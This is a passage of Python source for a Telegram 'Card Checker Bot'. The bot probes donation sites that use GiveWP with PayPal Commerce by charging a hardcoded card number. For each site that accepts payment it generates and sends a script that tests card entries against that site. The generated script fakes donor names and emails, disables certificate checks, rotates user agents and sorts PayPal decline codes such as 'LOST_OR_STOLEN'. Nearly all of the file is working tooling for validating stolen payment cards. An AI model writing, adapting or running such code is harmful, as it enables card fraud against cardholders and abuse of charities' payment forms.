                'id_form1': paypal.form_data.get('give-form-id-prefix', ''),
                'id_form2': paypal.form_data.get('give-form-id', ''),
                'nonec': paypal.form_data.get('give-form-hash', ''),
                'au': paypal.client_token or paypal.access_token or '',
                'client_id': paypal.client_id or '',
                'access_token': paypal.access_token or '',
                'client_token': paypal.client_token or '',
                'form_data': paypal.form_data, 'ajax_url': paypal.ajax_url or '',
                'cookies': paypal.cookies, 'url': paypal.url, 'inurl': paypal.inurl,
                'js_checked': paypal.js_checked,
            }
        for dr in DEAD_RESPONSES:
            if dr.lower() in result.lower():
                return {'link': link, 'live': False, 'respons': result, 'amount': None}
        return {'link': link, 'live': False, 'respons': result, 'amount': None}
    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100], 'amount': None}


@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(massege.from_user.id) in blocked:
        safe_send_message(massege.chat.id, 'The admin has blocked you.')
        return
    ko = safe_send_message(massege.chat.id, "- The gate is being withdrawn ...")
    if not ko: return
    time.sleep(1)
    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(massege.chat.id, ko.message_id, '- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>')
            return
        link = parts[1].strip()
        if not link.startswith(("http://", "https://")):
            safe_edit_message(massege.chat.id, ko.message_id, "Invalid link format ❌")
            return
        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            safe_edit_message(massege.chat.id, ko.message_id, f"Site returned status: {r.status_code} ❌")
            return
        time.sleep(1)
        safe_edit_message(massege.chat.id, ko.message_id, "Gate found ✅")
    except: pass
    try:
        paypal = PayPalLinkTester(target_url=link)
        result = paypal.Charge('4059986126444431|11|30|947')
        is_live = False
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in result.lower():
                is_live = True
                break
        if not is_live:
            for dr in DEAD_RESPONSES:
                if dr.lower() in result.lower():
                    safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
                    return
            safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
            return
        file_name = f'gateway_{int(time.time())}.py'
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(generate_gateway_code(result, link, paypal))
        amount_display = paypal.donation or paypal.minimum_amount or '1.00'
        safe_send_document(massege.chat.id, file_name, caption=f'''✅ <b>Live Gateway Found!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{link}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Response:</b> <code>{result}</code>
💰 <b>Amount:</b> <code>${amount_display}</code>
🔍 <b>JS Scanned:</b> <code>{paypal.js_checked}</code>
🎯 <b>Levels:</b> <code>{len(paypal.price_levels)}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30''')
        os.remove(file_name)
    except Exception as e:
        safe_edit_message(massege.chat.id, ko.message_id, f"❌ Error: {str(e)[:100]}")


@bot.message_handler(commands=['mass'])
def mass_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return
    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)


@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 Stopping...")
    else:
        safe_send_message(message.chat.id, "❌ No active process.")


def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, "❌ Please send a .txt file.")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]
        if not links:
            safe_send_message(message.chat.id, "❌ File is empty.")
            return
        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False
        }
        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
Url : ...
Respons : ...
━━━━━━━━━━━━━━━━━━
⏱️ Checked 0 of {total}
🛑 /stop to stop""")
        if not status_msg: return
        def update_status():
            last_text = ""
            while True:
                time.sleep(10)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False): break
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        current_url = processing_status[user_id]['current_url']
                        current_respons = processing_status[user_id]['current_respons']
                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        text = f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {percent}% {bar}
Url : <code>{current_url[:60] if current_url else '...'}</code>
Respons : <code>{current_respons[:60] if current_respons else '...'}</code>
━━━━━━━━━━━━━━━━━━
⏱️ Checked {processed} of {total}
🛑 /stop to stop"""
                        if text != last_text:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                            except: pass
                except: pass
        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()
        time.sleep(2)
        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False): break
            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'
            result = check_single_link(link)
            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']
                    try:
                        code = generate_gateway_code(result['respons'], result['link'], None, result)
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        amount_display = result.get('amount', '1.00') or '1.00'
                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{result['link']}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Response:</b> <code>{result['respons']}</code>
💰 <b>Amount:</b> <code>${amount_display}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30""")
                        try: os.remove(file_name)
                        except: pass
                    except Exception as e: print(f"Error sending file: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
            time.sleep(2)
        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']
        updater.join(timeout=2)
        final_text = f"""📊 <b>✅ Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live (Sent): {live}
❌ Dead: {dead}
💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30"""
        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except: safe_send_message(chat_id, final_text)
        if user_id in processing_status:
            del processing_status[user_id]
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")


def generate_gateway_code(result, link, paypal_obj=None, result_dict=None):
    id_form1 = ''; id_form2 = ''; nonec = ''; au = ''; client_id = ''; amount = '5.00'
    if paypal_obj:
        id_form1 = paypal_obj.form_data.get('give-form-id-prefix', '')
        id_form2 = paypal_obj.form_data.get('give-form-id', '')
        nonec = paypal_obj.form_data.get('give-form-hash', '')
        au = paypal_obj.client_token or paypal_obj.access_token or ''
        client_id = paypal_obj.client_id or ''
        amount = paypal_obj.donation or paypal_obj.minimum_amount or '5.00'
    elif result_dict:
        id_form1 = result_dict.get('id_form1', '')
        id_form2 = result_dict.get('id_form2', '')
        nonec = result_dict.get('nonec', '')
        au = result_dict.get('au', '')
        client_id = result_dict.get('client_id', '')
        amount = result_dict.get('amount', '5.00')
    if amount in ('1.00', '0', None, ''):
        amount = '5.00'
    return f'''import requests, re, random, time, base64, uuid
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from datetime import datetime

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert"]
        self.last_name = ["Smith", "Johnson", "Williams"]
        self.donation = "{amount}"
        self.id_form1 = "{id_form1}"
        self.id_form2 = "{id_form2}"
        self.nonec = "{nonec}"
        self.au = "{au}"
        self.client_id = "{client_id}"
        self.url = "{urlparse(link).netloc}"
        self.inurl = "{urlparse(link).path}"
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()

    def Charge(self, ccx):
        try:
            parts = ccx.strip().split("|")
            n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
            if "20" in yy: yy = yy.split("20")[1]
            expiry = f"20{{yy}}-{{mm}}"

            da = MultipartEncoder({{
                'give-form-id-prefix': (None, self.id_form1),
                'give-form-id': (None, self.id_form2),
                'give-form-hash': (None, self.nonec),
                'give-amount': (None, self.donation),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, random.choice(self.first_name)),
                'give_last': (None, random.choice(self.last_name)),
                'give_email': (None, self.email),
                'give-gateway': (None, 'paypal-commerce'),
            }})
            he = {{'content-type': da.content_type, 'user-agent': self.uu.random}}
            r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params={{'action': 'give_paypal_commerce_create_order'}}, headers=he, data=da, timeout=15)
            try:
                order_id = r3.json()['data']['id']
            except:
                return "Create Order Failed"

            he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.uu.random}}
            da3 = {{'payment_source': {{'card': {{'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}}}}}}, 'application_context': {{'vault': False}}}}
            self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source', headers=he4, json=da3, timeout=15)

            da4 = MultipartEncoder({{
                'give-form-id-prefix': (None, self.id_form1),
                'give-form-id': (None, self.id_form2),
                'give-form-hash': (None, self.nonec),
                'give-amount': (None, self.donation),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, random.choice(self.first_name)),
                'give_last': (None, random.choice(self.last_name)),
                'give_email': (None, self.email),
                'give-gateway': (None, 'paypal-commerce'),
            }})
            he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
            r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params={{'action': 'give_paypal_commerce_approve_order', 'order': order_id}}, headers=he5, data=da4, timeout=15)

            text = r5.text
            text_lower = text.lower()
            if 'true' in text_lower and 'error' not in text_lower:
                return 'CHARGE 1.00$'
            codes_check = [
                ('INSUFFICIENT_FUNDS', 'INSUFFICIENT_FUNDS'),
                ('PAYER_CANNOT_PAY', 'PAYER_CANNOT_PAY'),
                ('ORDER_NOT_APPROVED', 'Payer cannot pay for this transaction.'),
                ('RESTRICTED_OR_INACTIVE_ACCOUNT', 'RESTRICTED_OR_INACTIVE_ACCOUNT'),
                ('PAYEE_BLOCKED_TRANSACTION', 'PAYEE_BLOCKED_TRANSACTION'),
                ('GENERIC_DECLINE', 'GENERIC_DECLINE'),
                ('DO_NOT_HONOR', 'DO_NOT_HONOR'),
                ('CVV2_FAILURE', 'CVV2_FAILURE'),
                ('CVV_FAILURE', 'CVV_FAILURE'),
                ('EXPIRED_CARD', 'EXPIRED_CARD'),
                ('SUSPECTED_FRAUD', 'SUSPECTED_FRAUD'),
                ('ACCOUNT_CLOSED', 'ACCOUNT_CLOSED'),
                ('LOST_OR_STOLEN', 'LOST_OR_STOLEN'),
                ('TRANSACTION_REFUSED', 'TRANSACTION_REFUSED'),
            ]
            for keyword, label in codes_check:
                if keyword.lower() in text_lower:
                    return label
            if 'declined' in text_lower:
                return "DECLINED"
            try:
                return str(r5.json()['data']['error'])
            except:
                return "DECLINED"
        except Exception as e:
            return f"Error: {{e}}"

if __name__ == '__main__':
    print('Cheker')
    while True:
        ar = input('Enter Card: ')
        rr = PayPal()
        print('Response: ' + rr.Charge(ar))
        time.sleep(5)
'''


@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"
    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
[⚡] 𝐍𝐚𝐦𝐞: {userr}
[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
[⚡] 𝐈𝐃: <code>{user_id}</code>
- - - - - - - - - - - - - - - - - - - - - -
[⚡] PayPal Gateway >> /paypal
[⚡] Mass Extract >> /mass
[⚡] Send Feedback >> Button Below
- - - - - - - - - - - - - - - - - - - - - -
[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
[⚡] 𝐃𝐞𝐯 𝐁𝐲: Wafa.'''
    FRA = types.InlineKeyboardMarkup(row_width=2)
    FRA.add(types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr'))
    safe_send_message(message.chat.id, IU, reply_markup=FRA)


@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    Atty.add(types.InlineKeyboardButton("Back", callback_data="start"))
    try:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'Welcome {userr} Send your message.', parse_mode='HTML', reply_markup=Atty)
    except Exception as e:
        print(f"Feedback error: {e}")
    waiting_users[user_id] = True


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    safe_send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    safe_send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    safe_send_message(call.from_user.id, "Write your reply now:")


@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    safe_send_message(user_id, f"Admin response:\n\n{message.text}")
    safe_send_message(OWNER_ID, "Reply sent.")
    reply_mode.pop(message.from_user.id)


@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username or "No Username"
    IU = f'[⚡] Welcome {userr}\n[⚡] @{username}\n[⚡] ID: <code>{user_id}</code>'
    FRA = types.InlineKeyboardMarkup(row_width=2)
    FRA.add(types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr'))
    try:
        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
    except Exception as e:
        print(f"Back error: {e}")


@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_block} blocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")


@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_unblock} unblocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")


print('✅ Bot is running...')
try:
    bot.infinity_polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60)
except Exception as e:
    print(f'❌ Error: {e}')
